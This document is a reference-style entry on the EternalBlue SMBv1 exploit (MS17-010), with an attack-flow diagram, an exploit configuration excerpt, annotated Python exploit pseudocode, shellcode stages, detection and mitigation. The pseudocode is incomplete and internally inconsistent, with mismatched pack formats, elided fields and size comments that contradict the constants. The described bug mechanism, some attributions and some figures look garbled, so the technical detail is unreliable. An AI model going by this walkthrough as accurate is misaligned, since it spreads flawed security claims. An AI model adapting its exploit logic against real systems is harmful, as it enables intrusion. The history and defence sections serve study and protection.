---
title: "EternalBlue — SMBv1 Remote Exploit (MS17-010 / CVE-2017-0144)"
slug: eternalblue
group: equation-group
category: exploit
platform: Windows (all versions with SMBv1 enabled, up to Windows 10 / Server 2016)
cve: CVE-2017-0144
ms_bulletin: MS17-010
patch_date: 2017-03-14
source_available: true
source_url: https://github.com/misterch0c/shadowbroker
severity: CRITICAL (CVSS 9.3)
tags: [eternalblue, smb, ms17-010, cve-2017-0144, wannacry, notpetya, shadowbrokers]
mitre_techniques:
  - T1210  # Exploitation of Remote Services
  - T1190  # Exploit Public-Facing Application
downstream_use:
  - WannaCry (May 2017, Lazarus Group / DPRK)
  - NotPetya (June 2017, Sandworm / GRU Russia)
---

# EternalBlue — MS17-010 (CVE-2017-0144)

> **"The most consequential cyberweapon ever created and then lost."** — The New York Times

---

## In One Paragraph

EternalBlue is a remote exploit targeting a memory corruption bug in **SMBv1** (Server Message Block version 1) — a file-sharing protocol built into all versions of Windows. The bug allows an unauthenticated attacker to send a specially crafted packet to port 445 (SMB) and achieve **remote code execution as SYSTEM** — the highest privilege level — with no user interaction required. It was developed by NSA/TAO, leaked by the Shadow Brokers in April 2017, patched by Microsoft in March 2017 (one month before the leak), and was subsequently used in **WannaCry** (May 2017) and **NotPetya** (June 2017), causing roughly $14–18 billion in combined damages.

---

## The Vulnerability — Technical Breakdown

### What is SMBv1?

**SMB** (Server Message Block) is a network file and printer sharing protocol. Every Windows machine has SMB running by default. SMBv1 is the original 1980s-era version, still enabled by default in all Windows versions up to Windows 10 (until Microsoft finally disabled it by default in Windows 10 1709, October 2017 — after WannaCry).

SMBv1 runs on:
- TCP port **445** (modern direct SMB)
- TCP port **139** (legacy NetBIOS over TCP)

### The bug: Transaction2 parsing

The vulnerability resides in the way the Windows SMBv1 driver (`srv.sys`, a kernel driver) processes **Transaction2** sub-commands — a feature for sending secondary parameters in file-sharing operations.

The specific issue is a **type confusion / integer overflow** in how the SMB driver calculates buffer sizes when processing `NT_TRANSACT_SECONDARY` requests:

```
Normal SMB Transaction2 flow:
  Client → Server: [Transaction2 request, ParamCount=N, DataCount=M]
  Server: allocates buffer of size (N + M)
  Client → Server: [Secondary data]
  Server: copies secondary data into buffer

The bug:
  Client → Server: [Transaction2 request with crafted SetupCount/ParamCount]
  The driver miscalculates the required buffer size due to integer overflow
  Client → Server: [Oversized secondary data]
  Server: buffer overflow — attacker-controlled data written past buffer end
  ↓
  With careful heap grooming, this overwrites a kernel structure
  ↓
  Attacker achieves arbitrary kernel code execution
```

### Why it's unauthenticated

The Transaction2 processing happens **before authentication is checked** in the SMBv1 flow. An attacker on the network only needs to open a TCP connection to port 445 and send the crafted packets — no username, no password, no existing session.

### Why it's SYSTEM

`srv.sys` is a **kernel driver** — it runs in kernel mode (Ring 0). Code execution achieved through a kernel driver vulnerability runs at the highest privilege level (`NT AUTHORITY\SYSTEM`), with access to all system resources.

---

## How EternalBlue Works — Attack Flow

```
[Attacker machine]                    [Windows target — port 445 open]
       |                                             |
       |──── TCP SYN ──────────────────────────────>|
       |<─── TCP SYN-ACK ──────────────────────────|
       |──── TCP ACK ──────────────────────────────>|
       |                                             |
       |──── SMB Negotiate Protocol Request ───────>|  (1)
       |<─── SMB Negotiate Protocol Response ───────|  (2)
       |                                             |
       |──── SMB Session Setup (anonymous) ────────>|  (3)
       |<─── SMB Session Setup Response ────────────|  (4)
       |                                             |
       |──── SMB Tree Connect (IPC$) ───────────────>|  (5)
       |<─── SMB Tree Connect Response ─────────────|  (6)
       |                                             |
       |──── SMB Transaction2 (groom heap) ─────────>| (7) Heap grooming begins
       |──── SMB Transaction2 (groom heap) ─────────>| (8) Multiple rounds
       |──── SMB Transaction2 (groom heap) ─────────>| (9) of grooming
       |                                             |
       |──── SMB NT_TRANSACT_SECONDARY (overflow) ──>| (10) The exploit packet
       |                                             |     ← BUFFER OVERFLOW HERE
       |                                             |     Kernel structure overwritten
       |                                             |     Shellcode planted
       |<─── SMB Response (may error or succeed) ───|
       |                                             |
       |──── DoublePulsar install request ──────────>| (11) Payload delivery
       |<─── DoublePulsar acknowledgement ──────────|     Kernel backdoor installed
       |                                             |
       [DoublePulsar is now resident in kernel memory]
       [Attacker can inject DLLs / shellcode at will]
```

### Step-by-step annotation

**(1–2) SMB Negotiation**: Standard SMB handshake. Client asks "what SMB dialects do you support?" Server responds. No exploit yet.

**(3–6) Anonymous session**: SMB allows anonymous connections to the `IPC$` share by default. This gets the attacker "in the door" — still no authentication needed.

**(7–9) Heap grooming**: This is the sophisticated part. Before triggering the overflow, EternalBlue sends multiple carefully crafted Transaction2 packets to manipulate the **Windows kernel heap** layout. The goal is to ensure that when the overflow happens, it writes into a predictable location containing a specific kernel structure (a `_POOL_HEADER` or function pointer). This requires understanding the Windows kernel heap allocator in depth.

**(10) The overflow**: A single specially crafted `NT_TRANSACT_SECONDARY` packet with a manipulated `SetupCount` field causes the integer overflow in `srv.sys`. The miscalculated buffer size means attacker-controlled data overflows into adjacent kernel memory — which, thanks to the grooming, contains the target structure.

**(11) Payload delivery**: If the overflow succeeds and shellcode executes, EternalBlue typically delivers `DoublePulsar` as the payload — installing a kernel-mode backdoor for persistent access.

---

## The Code — Key Exploit Logic (Annotated)

EternalBlue is implemented as a FUZZBUNCH plugin in Python. The key exploit logic lives in the plugin's Python files and binary shellcode payloads.

### Exploit configuration (`eternalblue_params.xml` excerpt, annotated)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<plugin>
  <name>EternalBlue</name>
  
  <!-- The exploit targets Windows 7 / 2008 R2 by default.
       Different Windows versions have different heap layouts,
       requiring different grooming strategies. -->
  <param name="TargetHostName" type="string" required="false">
    <help>Hostname of target (optional — can use IP only)</help>
  </param>
  
  <param name="TargetPort" type="integer" required="true">
    <default>445</default>
    <help>Target SMB port. Always 445 for modern Windows.</help>
  </param>
  
  <!-- This is crucial for reliability. The exploit needs to 
       send many grooming packets, but too many = detectable.
       NSA operators were trained to tune this per target. -->
  <param name="MaxExploitAttempts" type="integer" required="true">
    <default>3</default>
    <help>
      Number of attempts before giving up. More attempts = more
      network noise. Tune based on target network monitoring posture.
    </help>
  </param>
  
  <!-- Timeout — NSA operators on slow or monitored links would
       increase this; on fast internal networks, decrease it -->
  <param name="NetworkTimeout" type="integer" required="true">
    <default>60</default>
    <help>Seconds to wait for network responses</help>
  </param>
  
  <!-- The Windows version affects which heap grooming strategy
       to use. Different kernel versions have different pool
       layouts. EternalBlue supports Windows XP through Server 2016. -->
  <param name="TargetOs" type="enum" required="false">
    <choices>XP, 2003, VISTA, 2008, WIN7, 2008R2, WIN8, 2012, WIN81, 2012R2, WIN10, 2016</choices>
    <default>WIN7</default>
    <help>Windows version of target. Affects exploit strategy.</help>
  </param>
</plugin>
```

### Python exploit runner (annotated pseudocode based on public analysis)

```python
# eternalblue_exploit7.py (Windows 7 / 2008 R2 variant)
# This is one of several OS-specific exploit scripts in the dump.
# Each Windows version requires slightly different heap grooming.

import socket
import struct

# ──────────────────────────────────────────────────────────────
# CONSTANTS
# SMBv1 packet structure constants
# ──────────────────────────────────────────────────────────────
SMB_COM_TRANSACTION2 = 0x25          # Transaction2 command byte
SMB_COM_NT_TRANSACT = 0xA0           # NT Transact command byte
NT_TRANSACT_SECONDARY = 0x07         # The subcommand with the bug

# Pool chunk sizes used in heap grooming
# These are specific to Windows 7 SP1 x64 kernel heap layout.
# Other Windows versions require different sizes.
GROOM_POOL_SIZE = 0x5010
TRANS2_PARAM_COUNT = 0x1F            # Specially crafted value
TRANS2_DATA_COUNT = 0x1F00           # Triggers the overflow when combined

def exploit(target_ip, target_port=445, payload=None):
    """
    Main exploit function.
    Returns True on success (shellcode executed), False on failure.
    """
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, target_port))
    
    # Step 1: SMB negotiate
    # Send the negotiate request — pick SMBv1 dialect
    send_negotiate(sock)
    recv(sock)
    
    # Step 2: Anonymous session setup
    send_session_setup(sock)
    recv(sock)
    
    # Step 3: Tree connect to IPC$
    send_tree_connect(sock, ip=target_ip)
    recv(sock)
    
    # Step 4: Heap grooming
    # Send many Transaction2 requests to arrange the kernel heap.
    # Goal: place allocations such that our overflow lands in
    # the right place.
    #
    # This is the most OS-specific part — Windows 7 vs 8 vs 10
    # have different NonPagedPool layouts. The groom sizes
    # below are tuned for Windows 7 SP1 x64.
    for i in range(12):
        # Send a 0x1000-byte allocation to fill up free space
        send_transaction2_groom(sock, count=GROOM_POOL_SIZE)
    
    for i in range(12):
        # Free every other one — creates holes of predictable size
        # This is "feng shui" heap grooming
        send_transaction2_free(sock, idx=i*2)
    
    # Step 5: Overflow packet
    # This is THE exploit packet.
    # NT_TRANSACT_SECONDARY with carefully crafted SetupCount
    # causes integer overflow in srv.sys buffer size calculation.
    overflow_packet = build_overflow_packet(
        setup_count=TRANS2_PARAM_COUNT,
        param_count=TRANS2_DATA_COUNT,
        payload=payload or default_shellcode()
    )
    sock.send(overflow_packet)
    
    # If grooming was correct, our shellcode now executes in kernel mode.
    # We wait briefly for the response.
    response = recv(sock)
    
    if exploit_succeeded(response):
        print("[*] EternalBlue: success — shellcode executed")
        return True
    else:
        print("[!] EternalBlue: attempt failed — retrying with different groom")
        return False

def build_overflow_packet(setup_count, param_count, payload):
    """
    Build the NT_TRANSACT_SECONDARY packet that triggers the bug.
    
    The key: SetupCount is set to a value that, when used in 
    the SMBv1 driver's buffer size calculation:
        buffer_size = SetupCount * 2 + ParamCount + DataCount
    overflows a 16-bit or 32-bit integer, resulting in a SMALLER
    buffer being allocated than the data we're about to send.
    
    Then DataCount bytes of data (containing our shellcode) are
    written past the end of this undersized buffer.
    """
    # [Packet construction — binary SMB format]
    # This is the critical packet. Every byte matters.
    
    header = struct.pack('<BBBHHHHHHHHHH',
        0xFF, 0x53, 0x4D, 0x42,  # SMB magic bytes: \xFFSMB
        NT_TRANSACT_SECONDARY,    # Command byte
        0x00,                     # NT Status
        0x18,                     # Flags
        0x07, 0xC8,               # Flags2
        ...
    )
    
    # NT_TRANSACT_SECONDARY fields
    # The crafted SetupCount * 2 overflows to a small value
    body = struct.pack('<BBHIII',
        setup_count,              # <-- crafted: causes overflow
        0x00,                     # Reserved
        param_count,              # ParamCount
        0x00000000,               # ParamOffset
        len(payload),             # DataCount — the real size
        ...
    )
    
    return header + body + payload
```

---

## Shellcode Payload

After the overflow, the first-stage shellcode that executes is responsible for:

1. **Stabilising the kernel** — the overflow may have corrupted adjacent structures; the shellcode patches them to prevent a BSOD
2. **Disabling kernel patch protection (KPP / PatchGuard)** — Windows includes a watchdog that detects kernel modifications; the shellcode disables or bypasses it
3. **Installing DoublePulsar** — the kernel-mode backdoor that provides persistent implant injection capability
4. **Restoring SMB service** — so the target machine continues operating normally (stealthy)

---

## Detection and Patching

### Microsoft Patch

- **Patch released**: March 14, 2017 (MS17-010)
- **Leak date**: April 14, 2017 — one month **after** the patch
- **Question**: Did Microsoft know? Former NSA director Michael Hayden confirmed the NSA has a process called the **Vulnerabilities Equities Process (VEP)** — a policy debate about whether to disclose bugs to vendors or retain them for offensive use. The timing of the patch (one month before the dump) suggests NSA notified Microsoft in advance of the planned release, though this has never been officially confirmed.

**For Windows XP/2003**: Microsoft initially did not patch these (end of life). After WannaCry caused NHS failures, Microsoft issued an emergency patch for XP — extremely rare.

### Detection methods

| Method | Details |
|--------|---------|
| Network IDS | Snort/Suricata rules detect the distinctive Transaction2 pattern |
| Windows event logs | SMBv1 access can be logged; unusual Transaction2 patterns stand out |
| EDR | Kernel shellcode execution patterns detectable by modern EDRs |
| Network scan | Shodan/Censys track exposed port 445; billions of machines were exposed in 2017 |

### Mitigation (beyond patching)

- **Disable SMBv1**: `Set-SmbServerConfiguration -EnableSMB1Protocol $false` (PowerShell)
- **Block port 445 at perimeter** — no legitimate reason for external access
- **Network segmentation** — limits lateral movement even if internal host is exploited

---

## Downstream Impact

EternalBlue is arguably the most consequential vulnerability exploit in history:

| Event | Date | Attacker | Damage |
|-------|------|---------|--------|
| WannaCry | May 12, 2017 | Lazarus Group (DPRK) | $4–8B; NHS, Telefónica, FedEx |
| NotPetya | Jun 27, 2017 | Sandworm (GRU Russia) | ~$10B; Maersk, Merck, Mondelēz |
| Bad Rabbit | Oct 2017 | GRU-linked | Smaller scale |
| Ongoing criminal ransomware | 2017–present | Multiple | Billions annually |

Metasploit incorporated EternalBlue in 2017, making it accessible to any penetration tester or criminal with a laptop.

---

## References

- [Microsoft MS17-010 Advisory](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
- [CVE-2017-0144 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2017-0144)
- [Zerosum0x0: EternalBlue deep-dive (2017)](https://zerosum0x0.blogspot.com/2017/04/doublepulsar-initial-smb-backdoor-ring.html)
- [RiskSense: Practical overview of MS17-010](https://www.risksense.com/blog/ms17-010-eternalblue-vulnerability-research)
- [GitHub: misterch0c/shadowbroker — EternalBlue source](https://github.com/misterch0c/shadowbroker/tree/master/windows/Exploits/EternalBlue)
- [NYT: "The untold story of NotPetya" (Wired, 2018)](https://www.wired.com/story/notpetya-cyberattack-ukraine-russia-code-crashed-the-world/)
